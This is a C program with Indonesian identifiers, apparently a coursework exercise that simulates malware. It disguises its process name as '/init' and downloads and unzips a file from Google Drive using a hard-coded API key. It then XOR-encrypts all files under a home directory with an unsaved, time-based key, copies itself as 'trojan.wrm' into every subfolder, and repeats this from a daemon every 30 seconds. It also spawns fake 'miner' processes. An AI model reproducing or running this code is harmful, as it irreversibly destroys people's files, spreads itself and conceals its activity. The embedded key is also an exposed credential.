#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <curl/curl.h>
#include <dirent.h>
#include <time.h>
#include <errno.h>
#include <sys/sysinfo.h>

unsigned char xor_key;

void encryptfile(const char *lokasiFile, unsigned char kunci) {
    FILE *fp = fopen(lokasiFile, "rb+");
    if (!fp) return;

    fseek(fp, 0, SEEK_END);
    long ukuranFile = ftell(fp);
    rewind(fp);

    unsigned char *buffer = malloc(ukuranFile);
    if (!buffer) {
        fclose(fp);
        return;
    }

    fread(buffer, 1, ukuranFile, fp);
    rewind(fp);

    for (long i = 0; i < ukuranFile; i++) buffer[i] ^= kunci;

    fwrite(buffer, 1, ukuranFile, fp);
    fclose(fp);
    free(buffer);
}

void encrypt(const char *pathDasar, unsigned char kunci) {
    struct dirent *entri;
    DIR *direktori = opendir(pathDasar);
    if (!direktori) return;

    char pathLengkap[1024];

    while ((entri = readdir(direktori)) != NULL) {
        if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0)
            continue;

        snprintf(pathLengkap, sizeof(pathLengkap), "%s/%s", pathDasar, entri->d_name);

        struct stat infoPath;
        if (stat(pathLengkap, &infoPath) == -1) continue;

        if (S_ISDIR(infoPath.st_mode)) {
            encrypt(pathLengkap, kunci);
        } else if (S_ISREG(infoPath.st_mode)) {
            encryptfile(pathLengkap, kunci);
        }
    }

    closedir(direktori);
}

void trojan(const char *direktoriTarget, const char *lokasiMalware) {
    DIR *dir = opendir(direktoriTarget);
    if (!dir) return;

    struct dirent *entri;
    char path[1024];

    while ((entri = readdir(dir)) != NULL) {
        if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", direktoriTarget, entri->d_name);

        struct stat st;
        if (stat(path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            trojan(path, lokasiMalware);
        }
    }

    char pathTujuan[1024];
    snprintf(pathTujuan, sizeof(pathTujuan), "%s/trojan.wrm", direktoriTarget);

    FILE *src = fopen(lokasiMalware, "rb");
    FILE *dst = fopen(pathTujuan, "wb");
    if (src && dst) {
        char buf[4096];
        size_t jumlah;
        while ((jumlah = fread(buf, 1, sizeof(buf), src)) > 0) {
            fwrite(buf, 1, jumlah, dst);
        }
    }
    if (src) fclose(src);
    if (dst) fclose(dst);

    closedir(dir);
}

void inidaemon(const char *direktoriTarget, const char *lokasiSendiri) {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    setsid();
    chdir("/");

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);

    while (1) {
        time_t waktu = time(NULL);
        unsigned char kunci = (unsigned char)(waktu % 256);

        encrypt(direktoriTarget, kunci);
        trojan(direktoriTarget, lokasiSendiri);

        sleep(30);
    }
}

int download_data() {
    CURL *curl;
    FILE *fp;
    CURLcode res;

    const char *url = "https://www.googleapis.com/drive/v3/files/12COBJZHO3orgy8LYCVOIVr0DPvI0Twzy?alt=media&key=AIzaSyB6kgi_bSqmnbnMxydPwnC2UFsBj4VPId8";
    const char *namaFile = "test.zip";

    curl = curl_easy_init();
    if (curl) {
        fp = fopen(namaFile, "wb");
        if (!fp) return 1;

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);

        if (res != CURLE_OK) return 1;
    } else return 1;

    char perintahUnzip[256];
    snprintf(perintahUnzip, sizeof(perintahUnzip), "unzip -o %s", namaFile);
    int hasilUnzip = system(perintahUnzip);
    if (hasilUnzip != 0) return 1;

    return 0;
}

void generate_random_hex(char *output, size_t length) {
    const char *hex_chars = "0123456789abcdef";
    for (size_t i = 0; i < length; i++) {
        output[i] = hex_chars[rand() % 16];
    }
    output[length] = '\0';
}

void log_miner_output(int miner_id, const char *hash) {
    FILE *logfile = fopen("/tmp/.miner.log", "a");
    if (!logfile) return;

    time_t now = time(NULL);
    struct tm *t = localtime(&now);

    fprintf(logfile, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
        t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
        t->tm_hour, t->tm_min, t->tm_sec,
        miner_id, hash);

    fclose(logfile);
}

void miner_process(int id) {
    char proc_name[64];
    snprintf(proc_name, sizeof(proc_name), "mine-crafter-%02d", id);
    prctl(PR_SET_NAME, (unsigned long)proc_name, 0, 0, 0);

    srand(time(NULL) ^ (getpid() << 16));

    while (1) {
        char hash[65];
        generate_random_hex(hash, 64);
        log_miner_output(id, hash);
        sleep(3 + rand() % 28);
    }
}

void rodok_bomb() {
    int max_miners = 3;

    for (int i = 0; i < max_miners; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            miner_process(i);
            exit(0);
        }
    }

    while (1) pause(); 
}

int main(int argc, char **argv) {
    const char *namaSamaran = "/init";
    size_t panjangNama = strlen(namaSamaran);
    size_t panjangArgv0 = strlen(argv[0]);

    if (panjangArgv0 >= panjangNama) {
        memset(argv[0], 0, panjangArgv0);
        strncpy(argv[0], namaSamaran, panjangArgv0);
    }

    prctl(PR_SET_NAME, (unsigned long)namaSamaran, 0, 0, 0);

    const char *folderTarget = "/home/evaldhio/new-folder/FiraCode/";

    if (download_data() == 0) {
        xor_key = (unsigned char)(time(NULL) & 0xFF);
        encrypt(folderTarget, xor_key);

        char lokasiProgram[1024];
        ssize_t panjang = readlink("/proc/self/exe", lokasiProgram, sizeof(lokasiProgram) - 1);
        if (panjang != -1) {
            lokasiProgram[panjang] = '\0';
            trojan(folderTarget, lokasiProgram);

            pid_t pid = fork();
            if (pid == 0) {
                rodok_bomb();
                exit(0);
            }

            inidaemon(folderTarget, lokasiProgram);
        } else {
            fprintf(stderr, "Gagal mendapatkan path executable.\n");
            return 1;
        }
    } else {
        fprintf(stderr, "Proses download atau extract gagal. Program dihentikan.\n");
        return 1;
    }

    return 0;
}
